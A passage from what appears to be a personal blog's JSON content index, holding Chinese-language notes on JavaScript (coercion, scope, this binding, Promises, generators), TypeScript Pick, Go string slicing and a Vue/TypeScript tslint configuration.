== NaN; // false 0 == []; // true -- 晕！ 0 == &#123;&#125;; // false 极端的例子 1234567891011121314151617181920212223242526272829 [] == ![] // true 2 == [2] // true &quot;&quot; == [null] // true 0 == &quot;\\n&quot; // true &quot;\\n&quot;等空字符串被toNumber强制转换成0 ~~~ * 抽象关系比较 a &lt; b - a和b的一方一个是数字，另一方将会被转化成数字进行比较 a &lt; b - a和b的一方两个都是字符串，将会按照字母顺序进行比较* **语法** * 语句与表达式 * 语句的结果值 语法不允许我们获取语句的结果值并将其赋值给另一个变量，如果需要可以使用`eval`来获取结果值 或者 `do&#123;..&#125;`代码块 ~~~js var a,b a = eval(&quot;if(true)&#123;b=4+38&#125;&quot;) a // 42 a = do &#123; if(true) &#123; b = 4 + 38 &#125; &#125; a // 42 ++和--++a 先执行加法运算然后返回a++ 先返回然后执行加法运算–a 先执行减法运算然后返回a– 先返回然后执行减法运算 ,逗号运算符将多个独立的表达式语句串联成一个语句 上下文规则 大括号 &#123;&#125; 对象常量123var a = &#123; b: 10&#125; 标签 / 代码块在这里是一个普通的代码块，可以和let块级作用域声明一起使用123&#123; b: foo()&#125; 标签语句 使用break和continue都可以带标签，实现goto那样的跳转continue foo 代表执行foobreak 代表跳出foo函数，从foo结束的位置开始执行 1234567891011foo: &#123; other: &#123; console.log(2) bar: &#123; console.log( &quot;Hello&quot; ); break foo; console.log( &quot;never runs&quot; ); &#125; &#125; console.log( &quot;World&quot; );&#125; 对象解构&#123;...obj&#125; - 赋值 / 命名参数对象解构 else if 和可选代码块 运算符优先级 &amp;&amp; &gt; || 短路 &amp;&amp; 和 ||可以造成逻辑短路 &amp;&amp; 运算符的优先级高于 ||，而 || 的优先级又高于 ? :。 try..finally.. switch() &#123; case &#125; 第二章 异步和性能 异步 异步是关于现在和将来的时间间隙，而并行是关于能够同时发生的事情,并行计算最常见的工具就是进程和线程。进程和线程独立运行，但多个线程能够共享单个进程的内存 事件循环把自身的工作分成一个个任务并顺序执行，不允许对共享内存的 并行访问和修改。通过分立线程中彼此合作的事件循环，并行和顺序执行可以共存。 并发运行的进程之间可能会存在相互影响，如果进程之间没有影响的话，不确定性是完全可以接受的 交互的程序可以采用协调交互顺序来处理这样的竞态条件，通过给请求固定获取位置，使得交互的两个程序无论请求顺序如何，最后返回的结果顺序是固定的。 竞态 - 只有第一个运行完成的程序起作用 协作 - 取到一个长期运行的“进程”，并将其分割成多个步骤或多批任务，使得其他并发“进程”有机会将自己的运算插入到事件循环队列中交替运行，事件循环队列的交替运行会提高 站点 /App 的响应（性能） 1234567891011121314var res = []function response(data) &#123; var chunk = data.splice(0,1000) res = res.concat( chunk.map(val =&gt; val * 2) ) if(data.length &gt; 0) &#123; // 通过setTimeout 方法将函数放到异步执行队列，不影响现有函数执行 setTimeout(function() &#123; response(data) &#125;, 0) &#125;&#125; 任务 - 类似于排队，严格指定任务队列中函数的先后执行顺序 回调 避免回调地狱 代码会变得非常复杂难以维护及更新 Promise","tags":[{"name":"读后感","slug":"读后感","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E8%AF%BB%E5%90%8E%E6%84%9F/"}]},{"title":"typescript - Pick","date":"2020-12-02T02:21:41.000Z","path":"2020/12/02/typescript-pick/","text":"什么是Pick就是从一个符合类型中，取出几个想要的类型的组合 12345678910111213type Pick&lt;T, K extends keyof T&gt; = &#123; [key in k]: T[key]&#125;interface TState &#123; name: string; age: number; like: string[]&#125;// if i just want one or two attribute of TState// we can use Pick to get the attribute we wantinterface TSingleState extends Pick&lt;TState, &#x27;name&#x27; | &#x27;age&#x27;&gt; &#123;&#125; 泛型中的extends 并不是用来继承的，而是用来约束类型的，所以K extends keyof T，应该是说key被约束在T的key中，不能超出这个范围 原文链接","tags":[]},{"title":"Object的方法","date":"2020-11-26T09:54:45.000Z","path":"2020/11/26/Object的方法/","text":"属性 Object.length 值为1 Object.prototype 可以为所有的Object类型的对象添加属性 方法 Object.assign() 用于将所有可枚举属性的值从一个或多个源对象分配到目标对象，并返回目标对象 此方法只会拷贝源对象自身的并且可枚举的属性到目标对象，该方法调用源对象的get和目标对象的set，如果为了将属性定义复制到原型应使用Object.getOwnPropertyDescriptor()和Object.defineProperty() Object.assign()是浅拷贝,会改变源对象的值 Object.create() 创建一个新对象，使用现有的对象来提供新创建的对象的__proto__ Object.defineProperty() Object.defineProperties() Object.entries() Object.freeze() Object.getOwnPropertyDescriptor() Object.getOwnPropertyNames() Object.getOwnPropertySymbols() Object.getPrototypeOf() Object.is() Object.isExtensible() Object.isFrozen() Object.isSealed() Object.keys() Object.preventExtensions() Object.seal() Object.setPrototypeOf() Object.values() 属性 Object.prototype.constructor 返回创建实例对象的Object构造函数的引用，此属性的值是对函数本身的引用，而不是一个包含函数名称的字符串 所有的对象都会从他的原型上继承一个constructor属性 Object.prototype.proto 该特性已从Web标准中删除，但是目前一些浏览器仍然支持，但是在未来某个时间停止使用，请尽量不要使用该特性 该属性是一个访问器属性(一个getter函数和setter函数)，暴露了通过它访问的对象的内部prototype(一个对象或null) 推介使用Object.getPrototypeOf/Reflect.getPrototypeOf和Object.setPrototypeOf/Reflect.setPrototypeOf(设置对象的prototype是一个缓慢的过程，会影响性能，应该尽量避免) Object.prototype.noSuchMethod Object.prototype.count 已被废弃 Object.prototype.parent 已被废弃 方法 Object.prototype.defineGetter() Object.prototype.defineGetter() Object.prototype.lookupGetter() Object.prototype.lookupSetter() Object.prototype.hasOwnProperty() Object.prototype.isPprototypeOf() Object.prototype.propertyIsEnumerable() Object.prototype.toSource() Object.prototype.toLocaleString() Object.prototype.toString() Object.prototype.unwatch() Object.prototype.valueOf() Object.prototype.watch() Object.prototype.eval() 已废弃","tags":[]},{"title":"《你不知道的javascript上卷》 知识点摘录","date":"2020-11-24T05:50:50.000Z","path":"2020/11/24/你不知道的javascript上卷/","text":"第一章 作用域和闭包 编译器查找类型 赋值操作的目标是谁(LHS) 和 谁是赋值操作的源头(RHS) RHS如果在所有嵌套的作用域中遍寻不到所需的变量，引擎就会爆出ReferenceError异常，如果找到了变量，但是要对变量的值进行不合理的操作，引擎就会抛出另一种类型的错误TypeError LHS如何在全局作用域中也无法找到目标变量，就会在全局作用域中创建一个具有该名称的变量，并将其返还给引擎，但是在‘严格模式’下执行的时候并不会创建一个全局变量，而是会和RHS一样抛出ReferenceError eval javascript的eval() 函数可以接受一个字符串作为参数，并将其中的内容视为javascript代码，尽量不要使用eval，会对系统安全造成影响 1eval(&#x27;var b = 3&#x27;) with with可以将一个没有或有多个属性的对象处理为一个完全隔离的词法作用域，因此这个对 象的属性也会被处理为定义在这个作用域中的词法标识符 尽管 with 块可以将一个对象处理为词法作用域，但是这个块内部正常的 var 声明并不会被限制在这个块的作用域中，而是被添加到 with 所处的函数作用域中 12345with(obj) &#123; a = 3; b = 4; c = 5;&#125; 匿名函数 匿名函数没有名称标识符，函数表达式可以是匿名的，而函数声明则不可以省略函数名 匿名函数在栈追踪中不会显示出有意义的函数名，使得调试很困难 如果没有函数名，引用自身时只能使用arguments.callee引用 匿名函数省略了对于代码可读性很重要的函数名 具名函数 有名称标识符 立即执行函数表达式 (function()&#123; &#125;)() try/catch分句会创建一个块级作用域，其中声明的变量仅在catch内部有效 let为其声明的变量隐式地了所在的块作用域。 垃圾收集 利用作用域进行垃圾回收，变量显式声明块作用域 变量及函数在内的所有声明都会在任何代码被执行前首先被处理，定义声明在编译阶段进行，赋值声明在执行阶段进行先有声明后有赋值函数声明会被提升，函数表达式及具名函数不会被提升在变量提升过程中，函数会被首先提升，其次才是变量尽管重复的声明会被忽略掉，但是出现后面的函数声明可以覆盖前面的 模块模式 必须有外部的封闭函数，函数必须至少被调用一次，每一次调用都会创建一个新的模块实例 封闭函数必须返回至少一个内部函数，这样内部函数才能在私有作用域中形成闭包，并且可以访问或者修改私有状态 修改模块实例的内容通过在模块实例内部保留对公共API对象的内部引用，可以从内部对模块是咧进行修改，包括添加或删除方法和属性，修改他们的值 现代模块机制 1234567891011121314151617181920212223242526272829303132333435363738394041424344// 封装模块var MyModules = (function Manager() &#123; var modules = &#123;&#125; fucntion define(name, deps, impl) &#123; // 通过for循环将deps里面的参数赋值为modules中的数据 for(var i = 0; i &lt; deps.length; i++) &#123; deps[i] = modules[deps[i]] &#125; // 通过apply将deps作为参数传给impl，并改变impl函数this的指向，使其指向impl modules[name] = impl.apply(impl, deps) &#125; function get(name) &#123; return modules[name] &#125; return &#123; define: define, get: get &#125;&#125;)()// 定义模块MyModules.define( &quot;bar&quot;, [], function() &#123; function hello(who) &#123; return &quot;Let me introduce: &quot; + who; &#125; return &#123; hello: hello &#125;;&#125;); MyModules.define(&#x27;foo&#x27;, [&#x27;bar&#x27;], function(bar) &#123; var hungry = &#x27;hippo&#x27; function awesome() &#123; console.log(bar.hello(hangry).toUpperCase()) &#125; return &#123; awesome &#125;&#125;) 通过同一个构造模块函数构造的模块之间可以作为参数使用 作用域 作用域链是基于动态作用域的，而不是代码中的作用域嵌套 123456789function foo() &#123; console.log( a ); // 2 &#125; function bar() &#123; var a = 3; foo();&#125; var a = 2; bar(); 第二章 this和对象原型 this提供了一种更优雅的方式来隐式传递一个对象引用，因此可以将API设计得更加简洁并且易于复用 this是在运行的时候绑定的，并不是在编写的时候绑定的，它的上下文取决于函数调用时用的耕种条件。 当一个函数被调用时，会创建一个活动记录（有时候也称为执行上下文）。这个记录会包 含函数在哪里被调用（调用栈）、函数的调用方法、传入的参数等信息。this 就是记录的 其中一个属性，会在函数执行的过程中用到 this 的綁定 默认绑定 - 如果函数直接使用不带有任何修饰的函数引用进行调用，使用默认绑定规则，如果使用了严格模式，全局对象将无法使用默认绑定，因此this会绑定到undefined 隐式绑定 - 如果函数调用位置含有上下文对象，隐式绑定规则会把函数调用中ths绑定到这个上下文对象，对象属性引用链中只有最顶层或者说最后一层会影响调用位置 隐式丢失 - 被隐式绑定的函数会丢失绑定对象，会应用默认绑定，从而把this绑定到全局对象或者undefined上(取决于是否是严格模式) 123456function foo() &#123; console.log( this.a ); &#125; function doFoo(fn) &#123; // fn 其实引用的是 foo fn(); // &lt;-- 调用位置！ &#125; var obj = &#123; a: 2, foo: foo &#125;; var a = &quot;oops, global&quot;; // a 是全局对象的属性 doFoo( obj.foo ); // &quot;oops, global&quot; 显示绑定 - JavaScript的宿主环境会提供一些特殊的函数，如果传入的是一个原始值(Number, String, Boolean)，原始值会被转成它对应的对象形式(new String(..), new Number(..), new Boolean(..))，这种通常认为是装箱 call(this, argument) 第一个对象用来绑定this，调用函数时指向这个this，call的参数是直接放进去的，函数会默认执行一次 apply(this, argument) 第一个对象用来绑定this，调用函数时指向这个this，apply的参数是一个数组，函数会默认执行一次 band(this, argument) 第一个对象用来绑定this，调用函数时指向这个this，band的参数是直接放进去的，函数不会默认执行一次 12345678910111213141516171819202122232425262728293031function test() &#123; console.log(arguments[0], &#x27;b&#x27;) console.log(this.a, &#x27;a&#x27;)&#125;var obj = &#123; a: 10, b: 20&#125;test(13)console.log(&#x27;call&#x27;)test.call(obj, obj.b)console.log(&#x27;apply&#x27;)test.apply(obj, [obj.b])console.log(&#x27;bind&#x27;)var test1 = test.bind(obj, obj.b)test()test1()// console13 bundefined acall20 b10 aapply20 b10 abindundefined bundefined a20 b10 a 显示绑定变种 硬绑定 1234function foo(something) &#123; console.log( this.a, something ); return this.a + something; &#125; var obj = &#123; a:2 &#125;; var bar = function() &#123; return foo.apply( obj, arguments ); &#125;; var b = bar( 3 ); // 2 3 console.log( b ); // 5 ES5 中提供了内置的方法 Function.prototype. bind API调用的上下文 许多第三方库以及javascript内置函数，提供了一个可选参数，统称为上下文，作用和bind(..)，确保回调函数使用指定的this 12345function foo(el) &#123; console.log( el, this.id ); &#125; var obj = &#123; id: &quot;awesome&quot; &#125;; // 调用 foo(..) 时把 this 绑定到 obj [1, 2, 3].forEach( foo, obj ); // 1 awesome 2 awesome 3 awesome new绑定 - 函数在new表达式中被调用时，它是一个构造函数，会初始化新创建的对象，称之为构造函数调用 使用new来调用函数，会自动执行下面操作 创建一个全新的对象 这个新对象会被执行[[原型]]连接 这个新对象会绑定到函数调用的this 如果函数没有返回其他对象，那么new表达式中的函数调用会自动返回这个新对象 this绑定优先级 默认绑定 &lt; 隐式绑定 &lt; 显示绑定 &lt; new绑定 判断this 判断是否在new中调用，绑定的是新创建的对象 是否通过call，apply，bind，绑定的是指定对象 判断是否在某个上下文对象中调用，绑定的是上下文对象 以上全部满足使用默认绑定，绑定到全局对象，严格模式下为undefined 对象 主要类型 - string,number,boolean,null,undefined,object 内置对象 - String,Number,Boolean,Array,Function,Object,Date,RegExp,Error 判断一个对象的类型 typeof 返回值是字符串 instanceof 返回值是boolean Object.prototype.toString.call(obj) 返回值是字符串 &#39;[object Object]&#39; 对象属性访问 - .a语法通常称为属性访问，[a]通常称为键访问，可以接受任意任意字符串作为属性名。 对象中，属性名永远都是字符串，如果使用string以外的其他值作为属性名，首先会被转成字符串 可计算属性名 - 属性键根据构造函数时传入的键值参数变化 属性和方法 - 函数不属于某个对象，只是相同函数对象的多个引用 复制对象 Object.assign(..)方法实现浅复制，它会遍历一个或者多个原对象的可枚举的自有键并将它们复制到目标对象，最后返回目标对象。object.assign使用=操作符来赋值，所以源对象属性的一些特性(比如writable)不会被复制到目标对象 属性描述符 Object.getOwnPropertyDescriptor(obj, key) 123456&#123; value: , writable: true, enumerable: true, configurable: true&#125; writable 决定是否可以修改属性的值 Configurable 如果属性是可配置的，就可以使用defineProperty(..)来修改 Enumerable 控制属性是否会出现在对象的属性枚举中，如果为false，遍历的时候不会出现在枚举中，但是仍然可以正常访问 不变性 对象常量 - 结合writable: false 和configurable: false就可以创建一个真正的常量属性（不可修改，重定义或者删除） 禁止扩展 - 如果想要禁止一个对象添加新属性并保留已有属性，可以使用Object.preventExtensions(..) 密封 - Object.seal(..)会创建一个密封的对象，这个方法实际上会在一个现有对象的基础上调用Object.preventExtensions(..)并把所有的属性标记为configurable: false，密封之后不仅不能添加新属性，也不能重新配置或者删除任何现有属性 冻结 - Object.freeze(..)会创建一个冻结对象，实际上会在一个现有对象的基础上调用Object.seal(..)，并将所有数据访问属性标记为writable: false 存在性 可用通过 in和Object.hasOwnProperty来检查属性是否在对象中，所有的普通对象都可以连接到Object.hasOwnProperty，但是通过Object.create()创建的对象无法访问Object.hasOwnProperty,这时可以通过Object.prototype.hasOwnProperty.call(obj, a),它借用基础的hasOwnProperty方法并显示绑定到obj上面 混合对象”类” 类理论","tags":[{"name":"读后感","slug":"读后感","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E8%AF%BB%E5%90%8E%E6%84%9F/"}]},{"title":"《你不知道javascript》 知识点摘录","date":"2020-11-20T01:44:55.000Z","path":"2020/11/20/《你不知道javascript》 读后感/","text":"第一部分 类型和语法 &amp;&amp; 运算符的优先级高于 ||, 而 || 的优先级高于 ? :, &amp;&amp; || 是左关联， ? : 是右关联 在 try...catch...中，如果包含在for循环中，在一定情况下会在i++执行之前执行，如果在try...catch...中，加入yield, 由于yield的特性，try并未结束，因此catch、finally并不会立即执行 finally中的return会覆盖try和catch中的return的返回值 switch switch中的匹配算法是=== case 中的表达式尽量不要使用 &amp;&amp; or ||，因为匹配的数值并一定严格相等 判断字段类型 typeof instanceof Object.prototype.toString.call(obj) 再给html标签添加id标签的时候回默认添加一个和标签相同名称的全局变量 在script标签中是使用javascript语言，如果语句中包含&lt;/script&gt;则会被视为script标签的结束，应该使用&quot;&lt;/sc&quot; + &quot;ript&gt;&quot;来代替 第二部分 异步和性能 尽量避免发送同步的ajax请求，因为这样会锁定浏览器的UI,并且阻塞所用的用户交互 javascript从不跨线程共享数据 New Promise() Promise.all()Promise.all可以将多个Promise实例包装成一个新的Promise实例，同时，成功和失败的返回值是不同的, 成功的时候返回一个结果数据，失败的时候则最先被reject失败的状态的值 返回的成功的结果的数据顺序和Promise.all接收到的数组顺序是一致的如果有一个promise被拒绝， 主Promise.all()就会被立刻拒绝，并丢弃来自其他所有promise的全部结果 1234567891011121314function add(fun1, fun2) &#123; return Promise.all([fun1, fun2]).then(values =&gt; &#123; return values &#125;)&#125;const fun1 = new Promise((resolve, reject) =&gt; &#123; resolve(2) &#125;)const fun2 = new Promise((resolve, reject) =&gt; &#123; resolve(4) &#125;)add(fun1, fun2).then(values =&gt; &#123; console.log(values) // [2, 4]&#125;) Promise.race Promise.race 竞赛模式 只要传入的数组里面那个结果先出来，就返回哪个结果（不论返回的接口是成功还是失败） 1234567891011121314151617let p1 = new Promise((resolve, reject) =&gt; &#123; setTimeout(() =&gt; &#123; resolve(&#x27;success&#x27;) &#125;,1000)&#125;)let p2 = new Promise((resolve, reject) =&gt; &#123; setTimeout(() =&gt; &#123; reject(&#x27;failed&#x27;) &#125;, 500)&#125;)Promise.race([p1, p2]).then((result) =&gt; &#123; console.log(result)&#125;).catch((error) =&gt; &#123; console.log(error) // 打开的是 &#x27;failed&#x27;&#125;) 调用Promise的then()时，只传入一个完全处理函数，一个默认拒绝处理函数就会顶替上来，把错误重新抛出，是的错误可以沿着Promise链传递下去，知道遇到显式定义的拒绝处理函数 Promise.finally 通常用来处理被丢弃或者忽略的promise, 如果有需要释放的资源可以在finally进行释放 Promise.none 所有的promise都被拒绝才返回 Promise.any 至少需要一个promise完成就返回 Promise.first 只要第一个Promise完成，后续任何拒绝和完成都会忽略 Promise.last 只有最后一个完成的Promise胜出 并发迭代 Promise.map 12345678910111213141516171819202122// 封装Promise.mapif(!Promise.map) &#123; Promise.map = function(vals, cb) &#123; return Promise.all( vals.map(function(val) &#123; return new Promise( function(resolve) &#123; cb(val, resolve) &#125;) &#125;) ) &#125;&#125;// 使用Promise.mapPromise.map([p1, p2, p3], function(pr, done) &#123; promise.resolve(pr).then((v) =&gt; &#123; done(v * 2) &#125;, done)&#125;).then((values) =&gt; &#123; console.log(values)&#125;) try...catch... 不能和Promise连用，try...catch...只有在同步的情况下才能捕捉到异常，任何异步的错误都将无法捕捉到 一些无效的使用Promise API: new Promise(null)、 Promise.all()、Promise.race(42) 生成器 function *foo()&#123; &#125; 定义生成器函数 123function *foo() &#123; // what to do...&#125; 调用生成器函数 123456789// 在此处创建了一个生成器foofunction *foo(x, y) &#123; return x + y&#125;// 创建一个的迭代器对象，将迭代器对象赋值给了变量itvar it = foo(3, 4)// 调用it.next() 指示生成器从当前的位置继续运行，停留在下一个yield或者生成器结束var res = it.next()res.value // 7 需要的next() 调用比yield语句多一个，因为第一个next()用来启动一个生成器，并运行到第一个yield处，第二个next()调用完第一个被暂停的yield表达式，第三个next()调用完成第二个yield，依次类推 可以通过next向yield表达式传值 yield 和 next()组合起来，在生成器的执行过程中，构成了一个双向消息传递系统 12345678910function *foo(x) &#123; var y = x * (yield &quot;hello&quot;) return y&#125;var it = foo(6) //初始化一个迭代器 itvar res = it.next()res.value // hellovar res = it.next(7)res.value // 42 最后一个next()由return来回答 value为return 出来的值，如果生成器中没有return，会有一个假定的，隐式的return，会在默认的情况下回答最后的next()调用提出的问题 多个迭代器 12345678910111213141516171819202122232425262728293031function *foo() &#123; var x = yield 2 z++ console.log(z, &#x27;z&#x27;) var y = yield (x * z) console.log(x,y,z)&#125;var z = 1var it1 = foo() // 第一个迭代器var it2 = foo() // 第二个迭代器var val1 = it1.next().valuevar val2 = it2.next().valueconsole.log(val1, val2, &quot;val1, val2&quot;)val1 = it1.next(val2 * 10).valueval2 = it2.next(val1 * 5).valueconsole.log(val1, val2, &quot;val1, val2, two&quot;)it1.next(val2 / 2)it2.next(val1 / 4)// console// 2 2 val1, val2// 2 z// 3 z// 40 600 val1, val2, two// 20 300 3// 200 10 3 多个迭代器交互的时候，生成器中包含有全局变量时，会对全局变量造成污染 可以用于记录函数生成的最后一个值 1234567891011121314151617181920var something = (function () &#123; var nextVal return &#123; [Symbol.interator]: function() &#123; return this &#125;, next: function() &#123; if(nextVal === undefined) &#123; nextVal = 1 &#125; else &#123; nextVal = (3 * nextVal) + 6 &#125; return &#123;done: false, value: nextVal&#125; &#125; &#125;&#125;)()something.next().value // 1something.next().value // 9something.next().value // 33 es6新增了一个for ... of ...循环，意味着可以通过原生循环语法自动贴袋标准迭代器 123456for (var v of something) &#123; console.log(v) if(v &gt; 10) &#123; break; &#125;&#125; 终止生成器 for ... of ... 循环内的break会触发finally语句，终止生成器，也可以在外部调用it.return(..)手动终止生成器的迭代器实例 调用it.return之后会立刻终止生成器，运行finally语句","tags":[{"name":"读后感","slug":"读后感","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E8%AF%BB%E5%90%8E%E6%84%9F/"}]},{"title":"golang-切割字符串和拼接字符串","date":"2020-11-12T06:07:23.000Z","path":"2020/11/12/golang-切割字符串和拼接字符串/","text":"今天在Leecode上面练习用go语言做题，偶遇一题 剑指 Offer 58 - II. 左旋转字符串 字符串的左旋转操作是把字符串前面的若干个字符转移到字符串的尾部。请定义一个函数实现字符串左旋转操作的功能。比如，输入字符串”abcdefg”和数字2，该函数将返回左旋转两位得到的结果”cdefgab” 示例： 12输入: s = &quot;abcdefg&quot;, k = 2输出: &quot;cdefgab&quot; 然后我想起来前些天偶然遇到的一个题，有用到这部分的知识 然后我急忙把对应代码复制过来，然后点击提交，令人激动的是竟然成功了，但是运行内存及时间太不理想 提交时间 提交结果 运行时间 内存消耗 语言16分钟前 通过 72 ms 9.1 MB Go 代码如下12345678910111213func reverseLeftWords(s string, n int) string &#123; var char int = n for char &lt; len(s) &#123; newstr = newstr + string(s[char]) char++ &#125; var char2 int = 0 for char2 &lt; n &#123; newstr = newstr + string(s[char2]) char2++ &#125; return newstr&#125; 然后我就打算使用golang自带的字符串切割的方法 结果还是比较理想的 提交时间 提交结果 运行时间 内存消耗 语言几秒前 通过 0 ms 3.5 MB Go 代码差不多只有一行123func reverseLeftWords(s string, n int) string &#123; return string([]byte(s)[n:]) + string([]byte(s)[:n])&#125; 字符串切割 string([]byte(s)[n:m])string([]byte(s)[n:m]) : 首先是通过byte方法将字符串转为字节 s代表需要转换的字符串 n代表切割的起始位置，省略代表从第0位开始 m代表切割的终点位置，省略代表到末尾结束 最后通过string()方法再将字节转为字符串 但是这种方法并不适用于带有中文的字符串 string([]rune(s)[n:m])首先是通过byte方法将字符串转为字节 s代表需要转换的字符串 n代表切割的起始位置，省略代表从第0位开始 m代表切割的终点位置，省略代表到末尾结束 最后通过string()方法再将字节转为字符串","tags":[{"name":"golang","slug":"golang","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/golang/"}]},{"title":"vue中使用typescript","date":"2020-10-22T07:45:24.000Z","path":"2020/10/22/vue中使用typescript/","text":"在此记录一下Vue中使用typescript时 遇到的一些问题 Cannot find module ‘./xxx/xxx’ or its corresponding type declarations原因是ts识别不了vue文件，在引入的最后加上.vue就可以了12345// 错误的写法import TestLayout from &#x27;./components/test-layout&#x27;// 正确的写法import TestLayout from &#x27;./components/test-layout.vue&#x27; 获取DOM元素时提示 Type &#39;HTMLElement | null&#39; is not assignable to type &#39;HTMLElement&#39;. Type &#39;null&#39; is not assignable to type &#39;HTMLElement&#39; eg: 1this.scaleBox = document.querySelector(&#x27;.scale-box&#x27;) 对获取到的信息做一次类型转换或者类型断言 12this.scaleBox = &lt;HTMLDivElement&gt;document.querySelector(&#x27;.scale-box&#x27;)this.scaleBox = document.querySelector(&#x27;.scale-box&#x27;) as HTMLElement 同时贴上我在网上找到的tslint配置 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214// tslint.json&#123; &quot;defaultSeverity&quot;: &quot;warning&quot;, &quot;extends&quot;: [ &quot;tslint:recommended&quot; ], &quot;linterOptions&quot;: &#123; &quot;exclude&quot;: [ &quot;node_modules/**&quot; ] &#125;, &quot;rules&quot;: &#123; &quot;indent&quot;: [true, &quot;spaces&quot;, 2], &quot;interface-name&quot;: false, &quot;no-consecutive-blank-lines&quot;: false, &quot;object-literal-sort-keys&quot;: false, &quot;ordered-imports&quot;: false, &quot;quotemark&quot;: [true, &quot;single&quot;] &#125;, // 禁止自动检测末尾行必须使用逗号，always总是检测，never从不检测，ignore忽略检测 &quot;trailing-comma&quot;: [true, &#123; &quot;singleline&quot;: &quot;never&quot;, &quot;multiline&quot;: &#123; &quot;objects&quot;: &quot;ignore&quot;, &quot;arrays&quot;: &quot;always&quot;, &quot;functions&quot;: &quot;never&quot;, &quot;typeLiterals&quot;: &quot;ignore&quot; &#125; &#125;], // 禁止给类的构造函数的参数添加修饰符 &quot;no-parameter-properties&quot;: false, // 禁止使用 debugger &quot;no-debugger&quot;: false, // 禁止行尾有空格 &quot;no-trailing-whitespace&quot;: false, // 禁止无用的表达式 &quot;no-unused-expression&quot;: true, // 定义过的变量必须使用 &quot;no-unused-variable&quot;: true, // 变量必须先定义后使用 &quot;no-use-before-declare&quot;: true, // 禁止使用 var &quot;no-var-keyword&quot;: true, // 必须使用 === 或 !==，禁止使用 == 或 !=，与 null 比较时除外 &quot;triple-equals&quot;: true, // 指定类成员的排序规则 &quot;member-ordering&quot;: false, // 禁止将 this 赋值给其他变量，除非是解构赋值 &quot;no-this-assignment&quot;: [ false, &#123; &quot;allowed-names&quot;: [ &quot;^self$&quot;, &quot;^that$&quot; ], &quot;allow-destructuring&quot;: true &#125; ], // 必须使用箭头函数，除非是单独的函数声明或是命名函数 &quot;only-arrow-functions&quot;: [ true, &quot;allow-declarations&quot;, &quot;allow-named-functions&quot; ], // 禁止出现空代码块，允许 catch 是空代码块 &quot;no-empty&quot;: [ true, &quot;allow-empty-catch&quot; ], // 禁止无用的类型断言 &quot;no-unnecessary-type-assertion&quot;: true, // 使用 return; 而不是 return undefined; &quot;return-undefined&quot;: true, // 禁止对 array 使用 for in 循环 &quot;no-for-in-array&quot;: true, &quot;comment-format&quot;: [ true, &quot;check-space&quot; ], // 单行注释格式化规则 // 定义函数时如果用到了覆写，则必须将覆写的函数写到一起 &quot;adjacent-overload-signatures&quot;: true, // 禁止对函数的参数重新赋值 &quot;no-parameter-reassignment&quot;: true, // if 后面必须有 &#123;，除非是单行 if &quot;curly&quot;: [ true, &quot;ignore-same-line&quot; ], // for in 内部必须有 hasOwnProperty &quot;forin&quot;: true, // 禁止在分支条件判断中有赋值操作 &quot;no-conditional-assignment&quot;: true, // 禁止使用 new 来生成 String, Number 或 Boolean &quot;no-construct&quot;: true, // 禁止 super 在一个构造函数中出现两次 &quot;no-duplicate-super&quot;: true, // 禁止在 switch 语句中出现重复测试表达式的 case &quot;no-duplicate-switch-case&quot;: true, // 禁止出现重复的变量定义或函数参数名 &quot;no-duplicate-variable&quot;: [ true, &quot;check-parameters&quot; ], // 禁止使用 eval &quot;no-eval&quot;: true, // 禁止对对象字面量进行类型断言（断言成 any 是允许的） &quot;no-object-literal-type-assertion&quot;: true, // 禁止没必要的 return await &quot;no-return-await&quot;: true, // 禁止在数组中出现连续的逗号，如 let foo = [,,] &quot;no-sparse-arrays&quot;: true, // 禁止 throw 字符串，必须 throw 一个 Error 对象 &quot;no-string-throw&quot;: true, // switch 的 case 必须 return 或 break &quot;no-switch-case-fall-through&quot;: true, // 使用实例的方法时，必须 bind 到实例上 &quot;no-unbound-method&quot;: [ true, &quot;ignore-static&quot; ], // 使用 &#123; ...foo, bar: 1 &#125; 代替 Object.assign(&#123;&#125;, foo, &#123; bar: 1 &#125;) // 前者的类型检查更完善 &quot;prefer-object-spread&quot;: true, // parseInt 必须传入第二个参数 &quot;radix&quot;: true, // 必须使用 isNaN(foo) 而不是 foo === NaN &quot;use-isnan&quot;: true, // // // 可维护性 // 这些规则可以增加代码的可维护性 // // 禁止函数的循环复杂度超过 20，https://en.wikipedia.org/wiki/Cyclomatic_complexity &quot;cyclomatic-complexity&quot;: [ true, 20 ], // 禁止使用废弃（被标识了 @deprecated）的 API &quot;deprecation&quot;: true, // 一个缩进必须用四个空格替代 &quot;indent&quot;: [ true, &quot;spaces&quot;, 4 ], // 禁止出现重复的 import &quot;no-duplicate-imports&quot;: true, // 禁止一个文件中出现多个相同的 namespace &quot;no-mergeable-namespace&quot;: true, // 文件类型必须时 utf-8 &quot;encoding&quot;: true, // import 语句中，关键字之间的间距必须是一个空格 &quot;import-spacing&quot;: true, // 接口可以 implement extend 和 merge &quot;interface-over-type-literal&quot;: true, // new 后面只必须有一个空格 &quot;new-parens&quot;: true, // 类型断言必须使用 as Type，禁止使用 &lt;Type&gt; // &lt;Type&gt; 容易被理解为 jsx &quot;no-angle-bracket-type-assertion&quot;: true, // 禁止连续超过三行空行 &quot;no-consecutive-blank-lines&quot;: [ true, 3 ], // 禁止使用特殊空白符（比如全角空格） &quot;no-irregular-whitespace&quot;: true, // 禁止使用 JSDoc，因为 TypeScirpt 已经包含了大部分功能 &quot;no-redundant-jsdoc&quot;: true, // 禁止使用三斜杠引入类型定义文件 &quot;no-reference-import&quot;: true, // 禁止变量定义时赋值为 undefined &quot;no-unnecessary-initializer&quot;: true, // 小数必须以 0. 开头，禁止以 . 开头，并且不能以 0 结尾 &quot;number-literal-format&quot;: true, // 必须使用 a = &#123;b&#125; 而不是 a = &#123;b: b&#125; &quot;object-literal-shorthand&quot;: true, // 变量申明必须每行一个，for 循环的初始条件中除外 &quot;one-variable-per-declaration&quot;: [ true, &quot;ignore-for-loop&quot; ], // if 后的 &#123; 禁止换行 &quot;one-line&quot;: true, // 必须使用单引号，jsx 中必须使用双引号 &quot;quotemark&quot;: [ true, &quot;single&quot;, 